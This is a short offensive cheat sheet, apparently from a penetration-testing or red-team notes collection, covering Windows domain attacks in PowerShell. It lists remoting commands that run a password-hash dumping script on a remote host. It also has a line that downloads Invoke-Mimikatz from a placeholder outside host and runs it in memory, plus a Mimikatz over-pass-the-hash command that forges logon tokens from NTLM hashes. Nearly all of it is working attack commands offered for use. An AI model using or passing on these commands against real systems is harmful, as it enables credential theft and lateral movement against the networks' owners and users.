### Pwsh remoting
```powershell
## Execute whoami & hostname commands on the indicated server
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName comp1.local          
## Execute the script Git-PassHashes.ps1 on the indicated server
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName comp1.local
## Enable Powershell Remoting on current Machine
Enable-PSRemoting
## Start a new session
$sess = New-PSSession -ComputerName <Name>
## Enter the Session
Enter-PSSession $sess
Enter-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName -Sessions <Sessionname>
```

### Invoke-Mimikatz
```powershell
## Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           
## "Over pass the hash" generate tokens from hashes
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
```